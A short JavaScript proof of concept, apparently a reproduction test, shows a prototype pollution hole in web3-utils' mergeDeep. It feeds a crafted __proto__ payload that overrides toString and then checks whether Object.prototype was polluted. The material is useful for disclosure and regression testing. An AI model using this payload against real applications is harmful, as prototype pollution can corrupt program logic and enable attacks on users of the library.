const Web3Utils = require('web3-utils');

let payload = { ["__proto__"]: { "toString": "polluted" } };

Web3Utils.mergeDeep({}, payload);

if (({}).toString == "polluted")
  throw Error("I pollute");
